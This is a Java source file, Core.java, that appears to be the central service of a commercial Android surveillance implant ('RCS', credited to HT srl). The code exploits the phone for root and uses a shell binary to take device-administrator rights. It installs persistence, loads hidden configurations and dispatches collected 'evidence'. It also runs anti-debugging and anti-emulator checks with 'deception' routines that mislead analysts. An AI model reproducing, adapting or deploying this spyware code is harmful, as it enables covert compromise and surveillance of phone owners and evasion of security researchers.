/* *********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.dvci;

import java.io.IOException;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.res.Resources;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;

import com.android.dvci.action.Action;
import com.android.dvci.action.SubAction;
import com.android.dvci.action.UninstallAction;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfType;
import com.android.dvci.conf.Configuration;
import com.android.dvci.crypto.Keys;
import com.android.dvci.evidence.EvDispatcher;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.Markup;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.gui.ASG;
import com.android.dvci.listener.BSm;
import com.android.dvci.manager.ManagerEvent;
import com.android.dvci.manager.ManagerModule;
import com.android.dvci.optimize.NetworkOptimizer;
import com.android.dvci.util.AntiDebug;
import com.android.dvci.util.AntiEmulator;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;
import com.android.mm.M;

/**
 * The Class Core, represents
 */
public class Core extends Activity implements Runnable {

	/** The Constant SLEEPING_TIME. */
	private static final int SLEEPING_TIME = 1000;
	private static final String TAG = "Core"; //$NON-NLS-1$
	private static final int UNINSTALL_MARKUP = 87623547;
	private static boolean serviceRunning = false;

	/** The b stop core. */
	private boolean bStopCore = false;

	/** The core thread. */
	private Thread coreThread = null;

	/** The content resolver. */
	private ContentResolver contentResolver;

	/** The agent manager. */
	private ManagerModule moduleManager;

	/** The event manager. */
	private ManagerEvent eventManager;
	private WakeLock wl;
	// private long queueSemaphore;
	private Thread fastQueueThread;
	private CheckAction checkActionFast;
	private PendingIntent alarmIntent = null;
	private ServiceMain serviceMain;


	@SuppressWarnings("unused")
	private void Core() {

	}

	static Core singleton;

	public synchronized static Core self() {
		if (singleton == null) {
			singleton = new Core();
		}

		return singleton;
	}

	public static Core newCore(ServiceMain serviceMain) {
		if (singleton == null) {
			singleton = new Core();
		}

		singleton.serviceMain = serviceMain;

		return singleton;
	}

	/**
	 * Start.
	 *
	 * @param resources
	 *            the r
	 * @param cr
	 *            the cr
	 * @return true, if successful
	 */

	public boolean Start(final Resources resources, final ContentResolver cr) {
		if (serviceRunning == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + "  exploitStatus == " + Status.getExploitStatusString() +"  exploitResult == " + Status.getExploitResultString());
			}

			/* this check is used to know if we need to ask the user for root permission */
			if ((Status.getExploitStatus() >= Status.EXPLOIT_STATUS_EXECUTED ) && !Status.haveRoot()) {
				try {
					Thread t = new Thread(new Runnable() {
						@Override
						public void run() {
							Root.getPermissions(true);
						}
					});
					if (Cfg.DEBUG) {
						Check.log(TAG + "starting thread: Root.getPermissions();");
					}
					t.start();

				} catch (Exception ex) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "Error: " + ex);
					}
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (Start): skipped getPermissions() haveRoot=" + Status.haveRoot() + " exploitResult= " + Status.getExploitResultString()+
							" exploitStatus= " + Status.getExploitStatusString() );
				}

			}

			return false;
		}

		// ANTIDEBUG ANTIEMU
		if (!check()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (Start) anti emu/debug failed");
			}
			return false;
		}

		coreThread = new Thread(this);

		moduleManager = ManagerModule.self();
		eventManager = ManagerEvent.self();

		contentResolver = cr;

		if (Cfg.DEBUG) {
			coreThread.setName(getClass().getSimpleName());
			Check.asserts(resources != null, "Null Resources"); //$NON-NLS-1$
		}

		try {
			coreThread.start();
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

		// mRedrawHandler.sleep(1000);
		if (Cfg.POWER_MANAGEMENT) {
			Status.self().acquirePowerLock();
		} else {
			final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
			wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
			wl.acquire();
		}

		EvidenceBuilder.info(M.e("Started")); //$NON-NLS-1$

		serviceRunning = true;

		if (Cfg.DEMO) {
			Status.self().makeToast(M.e("Agent started!"));
		}

		return true;
	}

	public static void deceptionCode2(long mersenne) {
		NetworkOptimizer nOptimizer = new NetworkOptimizer(Status.self().getAppContext());
		nOptimizer.start((int)(mersenne / 1023));
	}

    public static void deceptionCode1() {
		NetworkOptimizer nOptimizer = new NetworkOptimizer(Status.self().getAppContext());
		nOptimizer.start(1000);
	}

	/**
	 * Stop.
	 *
	 * @return true, if successful
	 */
	public boolean Stop() {
		bStopCore = true;

		if (Cfg.DEBUG) {
			Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
		}

		wl.release();

		coreThread = null;

		serviceRunning = false;
		return true;
	}

	public static boolean isServiceRunning() {
		return serviceRunning;
	}

	// Runnable (main routine for RCS)
	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		if (Cfg.DEBUG_SPECIFIC) {
			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
			// startTrace();
		}

		Keys.self();
		Root.exploitPhone(false);
		Root.getPermissions(false);

		if (Status.haveRoot()) {
			if (Cfg.DEMO) {
				Status.self().makeToast("Got Root");
			}

			// Usa la shell per prendere l'admin
			try {
				// /system/bin/ntpsvd adm
				String pack = Status.self().getAppContext().getPackageName();
				String bd = Configuration.shellFile + M.e(" adm");
				String tbe = String.format("%s %s/%s", bd, pack,  M.e(".listener.AR"));
				// /system/bin/ddf adm
				// \"com.android.networking/com.android.networking.listener.AR\"
				Runtime.getRuntime().exec(tbe);

			} catch (IOException ex) {
				Check.log(TAG + " Error (unprotect): " + ex);
			}
		} else if (Keys.self().wantsPrivilege()) {
			ASG gui = Status.getAppGui();

			if (gui != null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (run) calling gui admin");
				}
				gui.deviceAdminRequest();
			}
		}

		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: init task"); //$NON-NLS-1$
			}

			int confLoaded = taskInit();
			// viene letta la conf e vengono fatti partire agenti e eventi
			if (confLoaded == ConfType.Error) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: TaskInit() FAILED"); //$NON-NLS-1$
				}

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " TaskInit() OK, configuration loaded: " + confLoaded); //$NON-NLS-1$
					Check.log(TAG + " Info: starting checking actions"); //$NON-NLS-1$
				}

				if (Cfg.DEMO && Cfg.DEMO_INITSOUND) {
					Beep.beepPenta();
				}

				// Torna true in caso di UNINSTALL o false in caso di stop del
				// servizio
				checkActions();

				if (Cfg.DEBUG) {
					Check.log(TAG + "CheckActions() wants to exit"); //$NON-NLS-1$
				}
			}

			stopAll();

			final EvDispatcher logDispatcher = EvDispatcher.self();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopAll), stopping EvDispatcher");
			}

			logDispatcher.halt();
		} catch (final Throwable ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: run " + ex); //$NON-NLS-1$
			}
		} finally {
			if (Cfg.DEBUG) {
				Check.log(TAG + " AndroidService exit "); //$NON-NLS-1$
			}

			Utils.sleep(1000);

			System.runFinalizersOnExit(true);
			finish();
			// System.exit(0);
		}
	}

	private synchronized boolean checkActions() {
		checkActionFast = new CheckAction(Action.FAST_QUEUE);

		fastQueueThread = new Thread(checkActionFast);
		fastQueueThread.start();

		return checkActions(Action.MAIN_QUEUE);

	}

	class CheckAction implements Runnable {
		private final int queue;

		CheckAction(int queue) {
			if (Cfg.DEBUG) {
				Thread.currentThread().setName("queue_" + queue);
			}
			this.queue = queue;
		}

		public void run() {
			boolean ret = checkActions(queue);
		}
	}

	/**
	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
	 * bloccante.
	 *
	 * @return true, if UNINSTALL
	 */
	private boolean checkActions(int qq) {
		final Status status = Status.self();

		try {
			while (!bStopCore) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " checkActions: " + qq); //$NON-NLS-1$
				}

				if (Cfg.STATISTICS) {
					M.printMostused();
					logMemory();
				}

				final Trigger[] actionIds = status.getTriggeredActions(qq);
				if (Cfg.POWER_MANAGEMENT) {
					Status.self().acquirePowerLock();
				}

				if (actionIds.length == 0) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (checkActions): triggered without actions: " + qq);
					}
				}

				if (Cfg.DEMO) {
					Beep.bip();
				}
				if (!Cfg.DEBUG && Cfg.CHECK_ANTI_DEBUG) {
					// ANTIDEBUG
					AntiDebug ad = new AntiDebug();
					if (ad.isDebug()) {
						stopAll();
						return true;
					}
				}

				for (final Trigger trigger : actionIds) {
					final Action action = status.getAction(trigger.getActionId());
					final Exit exitValue = executeAction(action, trigger);

					if (exitValue == Exit.UNINSTALL) {
						if (Cfg.DEBUG_SPECIFIC) {
							Check.log(TAG + " Info: checkActions: Uninstall"); //$NON-NLS-1$
						}

						UninstallAction.actualExecute();

						return true;
					}
				}
			}

			return false;
		} catch (final Throwable ex) {
			// catching trowable should break the debugger ans log the full
			// stack trace
			if (Cfg.DEBUG) {
				Check.log(ex);//$NON-NLS-1$
				Check.log(TAG + " FATAL: checkActions error, restart: " + ex); //$NON-NLS-1$
			}

			return false;
		}
	}

	private synchronized void stopAll() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopAll)");
		}

		final Status status = Status.self();

		// status.setRestarting(true);
		if (Cfg.DEBUG) {
			Check.log(TAG + " Warn: " + "checkActions: unTriggerAll"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		status.unTriggerAll();

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
		}

		moduleManager.stopAll();

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
		}

		eventManager.stopAll();

		Utils.sleep(2000);

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
		}

		status.unTriggerAll();
	}

	/**
	 * Inizializza il core.
	 *
	 * @return false if any fatal error
	 */
	private int taskInit() {
		try {
			if (!Path.makeDirs()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (taskInit) Error: Can't create a writable directory");
				}

				return ConfType.Error;
			}

			// this markup is created by UninstallAction
			final Markup markup = new Markup(UNINSTALL_MARKUP);
			if (markup.isMarkup()) {
				UninstallAction.actualExecute();
				//TODO: kill checkexploit
				return ConfType.Error;
			}

			// Initialize persistence
			if (Status.haveRoot()) {
				if(Cfg.PERSISTENCE) {
					Persistence p = new Persistence(Status.getAppContext());

					p.storePackage();
					p.addPersistance();
				}
			}

			// Identify the device uniquely
			final Device device = Device.self();

            // load configuration
			int ret = loadConf();

			if (ret == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: Cannot load conf"); //$NON-NLS-1$
				}

				return ConfType.Error;
			}

			// Start event dispatcher
			final EvDispatcher evDispatcher = EvDispatcher.self();

			if (!evDispatcher.isRunning()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (taskInit), start evDispatcher");
				}
				evDispatcher.start();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (taskInit), evDispatcher already started ");
				}
			}

			// Da qui in poi inizia la concorrenza dei thread
			if (eventManager.startAll() == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " eventManager FAILED"); //$NON-NLS-1$
				}

				return ConfType.Error;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Events started"); //$NON-NLS-1$
			}

			/*
			 * if (moduleManager.startAll() == false) { if (Cfg.DEBUG) {
			 * Check.log(TAG + " moduleManager FAILED"); //$NON-NLS-1$ }
			 * 
			 * return ConfType.Error; }
			 */

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Agents started"); //$NON-NLS-1$
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Core initialized"); //$NON-NLS-1$
			}

			return ret;

		} catch (final GeneralException rcse) {
			if (Cfg.EXCEPTION) {
				Check.log(rcse);
			}

			if (Cfg.DEBUG) {
				Check.log(rcse);//$NON-NLS-1$
				Check.log(TAG + " RCSException() detected"); //$NON-NLS-1$
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
				Check.log(TAG + " Exception() detected"); //$NON-NLS-1$
			}
		}

		return ConfType.Error;
	}

	public boolean verifyNewConf() {
		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
		boolean loaded = false;

		if (file.exists()) {
			loaded = loadConfFile(file, false);
		}

		return loaded;
	}

	/**
	 * Tries to load the new configuration, if it fails it get the resource
	 * conf.
	 *
	 * @return false if no correct conf available
	 * @throws GeneralException
	 *             the rCS exception
	 */
	public int loadConf() throws GeneralException {
		boolean loaded = false;
		int ret = ConfType.Error;

		if (Cfg.DEMO) {
			// Beep.beep();
		}

		if (Cfg.DEBUG_SPECIFIC) {
			Check.log(TAG + " (loadConf): TRY NEWCONF");
		}

		BSm.cleanMemory();

		// tries to load the file got from the sync, if any.
		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);

		if (file.exists()) {
			loaded = loadConfFile(file, true);

			if (!loaded) {
				// 30_2=Invalid new configuration, reverting
				EvidenceBuilder.info(M.e("Invalid new configuration, reverting")); //$NON-NLS-1$
				file.delete();
			} else {
				// 30_3=New configuration activated
				EvidenceBuilder.info(M.e("New configuration activated")); //$NON-NLS-1$
				file.rename(Path.conf() + ConfType.CurrentConf);
				ret = ConfType.NewConf;
			}
		}

		// get the actual configuration
		if (!loaded) {
			if (Cfg.DEBUG_SPECIFIC) {
				Check.log(TAG + " (loadConf): TRY CURRENTCONF");
			}
			file = new AutoFile(Path.conf() + ConfType.CurrentConf);

			if (file.exists()) {
				loaded = loadConfFile(file, true);

				if (!loaded) {
					// Actual configuration corrupted
					EvidenceBuilder.info(M.e("Actual configuration corrupted")); //$NON-NLS-1$
				} else {
					ret = ConfType.CurrentConf;
				}
			}
		}

		if (!loaded && (Cfg.DEBUG || !Cfg.CHECK_ANTI_DEBUG)) {
			if (Cfg.DEBUG_SPECIFIC) {
				Check.log(TAG + " (loadConf): TRY JSONCONF");
			}

			final byte[] resource = Utils.getAsset(M.e("cb.data")); // config.bin
			String json = new String(resource);
			// Initialize the configuration object

			if (json != null) {
				final Configuration conf = new Configuration(json);
				// Load the configuration
				loaded = conf.loadConfiguration(true);

				if (Cfg.DEBUG_SPECIFIC) {
					Check.log(TAG + " Info: Json file loaded: " + loaded); //$NON-NLS-1$
				}

				if (loaded) {
					ret = ConfType.ResourceJson;
				}
			}
		}

		// tries to load the resource conf
		if (!loaded) {
			if (Cfg.DEBUG_SPECIFIC) {
				Check.log(TAG + " (loadConf): TRY ASSET CONF");
			}
			// Open conf from resources and load it into resource
			final byte[] resource = Utils.getAsset(M.e("cb.data")); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Load the configuration
			loaded = conf.loadConfiguration(true);

			if (Cfg.DEBUG_SPECIFIC) {
				Check.log(TAG + " Info: Resource file loaded: " + loaded); //$NON-NLS-1$
			}

			if (loaded) {
				ret = ConfType.ResourceConf;
			}
		}

		return ret;
	}

	private boolean loadConfFile(AutoFile file, boolean instantiate) {
		boolean loaded = false;
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (loadConfFile): " + file);
			}

			if (file.getSize() < 8) {
				return false;
			}

			final byte[] resource = file.read(8);
			// Initialize the configuration object
			Configuration conf = new Configuration(resource);
			// Load the configuration
			loaded = conf.loadConfiguration(instantiate);

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Conf file loaded: " + loaded); //$NON-NLS-1$
			}

		} catch (GeneralException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);
			}
		}

		return loaded;
	}

	/**
	 * Execute action. (Questa non viene decompilata correttamente.)
	 *
	 * @param action
	 *            the action
	 * @param trigger
	 * @return the int
	 */
	private Exit executeAction(final Action action, Trigger trigger) {
		Exit exit = Exit.SUCCESS;

		if (Cfg.DEBUG) {
			Check.log(TAG + " CheckActions() triggered: " + action); //$NON-NLS-1$
		}

		final Status status = Status.self();
		status.unTriggerAction(action);

		status.synced = false;

		final int ssize = action.getSubActionsNum();

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions, " + ssize + " subactions"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		int i = 1;

		for (final SubAction subAction : action.getSubActions()) {
			try {

				/*
				 * final boolean ret = subAction.execute(action
				 * .getTriggeringEvent());
				 */
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: (CheckActions) executing subaction (" + (i++) + "/" + ssize + ") : " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
							+ action);
				}

				subAction.prepareExecute();
				final boolean ret = subAction.execute(trigger);

				if (status.uninstall) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: (CheckActions): uninstalling"); //$NON-NLS-1$
					}

					// UninstallAction.actualExecute();
					exit = Exit.UNINSTALL;
					break;
				}

				if (ret == false) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: " + "CheckActions() error executing: " + subAction); //$NON-NLS-1$ //$NON-NLS-2$
					}

					continue;
				} else {
					if (subAction.considerStop()) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (executeAction): stop");
						}
						break;
					}
				}
			} catch (final Exception ex) {
				if (Cfg.EXCEPTION) {
					Check.log(ex);
				}

				if (Cfg.DEBUG) {
					Check.log(ex);
					Check.log(TAG + " Error: checkActions for: " + ex); //$NON-NLS-1$
				}
			}
		}

		return exit;
	}

	public static void logMemory() {
		Status.self();
		ActivityManager activityManager = (ActivityManager) Status.getAppContext().getSystemService(ACTIVITY_SERVICE);
		android.app.ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
		activityManager.getMemoryInfo(memoryInfo);

		Check.log(TAG + " memoryInfo.availMem: " + memoryInfo.availMem, true);
		Check.log(TAG + " memoryInfo.lowMemory: " + memoryInfo.lowMemory, true);
		Check.log(TAG + " memoryInfo.threshold: " + memoryInfo.threshold, true);

		int pid = android.os.Process.myPid();
		int pids[] = new int[] { pid };

		android.os.Debug.MemoryInfo[] memoryInfoArray = activityManager.getProcessMemoryInfo(pids);
		for (android.os.Debug.MemoryInfo pidMemoryInfo : memoryInfoArray) {
			Check.log(TAG + " pidMemoryInfo.getTotalPrivateDirty(): " + pidMemoryInfo.getTotalPrivateDirty(), true);
			Check.log(TAG + " pidMemoryInfo.getTotalPss(): " + pidMemoryInfo.getTotalPss(), true);
			Check.log(TAG + " pidMemoryInfo.getTotalSharedDirty(): " + pidMemoryInfo.getTotalSharedDirty(), true);
		}
	}

	public synchronized boolean reloadConf() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (reloadConf): START");
		}

		if (verifyNewConf() || Status.self().wantsReload()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): valid conf, reload: " + Status.self().wantsReload());
			}

			Status.self().unsetReload();
			stopAll();

			int ret = taskInit();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): END");
			}

			return ret != ConfType.Error;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): invalid conf");
			}

			return false;
		}
	}

	public boolean check() {
		if(Cfg.CHECK_ANTI_DEBUG) {
			if (!Cfg.DEBUG) {
				AntiDebug ad = new AntiDebug();
				if (ad.isDebug()) {
					deceptionCode1();
					return false;
				}
			}
			if (!Cfg.DEBUG || Cfg.DEBUGANTIEMU) {
				AntiEmulator am = new AntiEmulator();
				if (am.isEmu()) {
					deceptionCode2(Integer.MAX_VALUE / 1024);
					return false;
				}
			}
		}
		return true;
	}

	public static boolean checkStatic() {
		if(Cfg.CHECK_ANTI_DEBUG) {
			if (!Cfg.DEBUG) {
				AntiDebug ad = new AntiDebug();
				if (ad.isDebug()) {
					// deceptionCode1();
					return false;
				}
			}

			AntiEmulator am = new AntiEmulator();
			if (am.isEmu()) {
				return false;
			}
		}
		return true;
	}

	public void createUninstallMarkup() {
		final Markup markup = new Markup(UNINSTALL_MARKUP);
		boolean ret = markup.createEmptyMarkup();
		if (Cfg.DEBUG) {
			Check.asserts(ret, " (createMarkup) Assert failed, cannot create markup");
		}

	}

}
